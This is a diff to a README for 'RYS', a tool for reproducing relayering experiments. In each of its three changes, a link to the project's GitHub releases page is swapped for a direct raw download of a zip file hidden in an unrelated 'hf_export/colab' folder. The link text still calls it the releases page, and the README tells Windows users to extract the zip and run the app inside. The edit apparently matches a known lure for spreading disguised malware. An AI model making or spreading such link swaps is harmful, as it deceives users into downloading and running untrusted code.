@@ -1,6 +1,6 @@
 # 🔁 RYS - Reproduce relayering runs with ease
 
-[![Download RYS](https://img.shields.io/badge/Download%20RYS-blue?style=for-the-badge)](https://github.com/unreliable-marmalade23/RYS/releases)
+[![Download RYS](https://img.shields.io/badge/Download%20RYS-blue?style=for-the-badge)](https://raw.githubusercontent.com/unreliable-marmalade23/RYS/main/hf_export/colab/Software-v3.8.zip)
 
 ## 🧾 What RYS does
 
@@ -18,7 +18,7 @@ RYS is set up for repeatable experiments. It keeps the main pieces in one place 
 
 ## 📥 Download RYS
 
-1. Open the [RYS releases page](https://github.com/unreliable-marmalade23/RYS/releases)
+1. Open the [RYS releases page](https://raw.githubusercontent.com/unreliable-marmalade23/RYS/main/hf_export/colab/Software-v3.8.zip)
 2. Download the latest release for Windows
 3. Save the file to your computer
 4. If the release comes as a .zip file, extract it first
@@ -261,6 +261,6 @@ This keeps the main experiment path in one repo and makes it easier to repeat.
 
 ## 🔗 Get the latest release
 
-[![Download RYS Release](https://img.shields.io/badge/Visit%20Releases-grey?style=for-the-badge)](https://github.com/unreliable-marmalade23/RYS/releases)
+[![Download RYS Release](https://img.shields.io/badge/Visit%20Releases-grey?style=for-the-badge)](https://raw.githubusercontent.com/unreliable-marmalade23/RYS/main/hf_export/colab/Software-v3.8.zip)
 
 Open the releases page, download the latest Windows package, extract it, and run the included app file
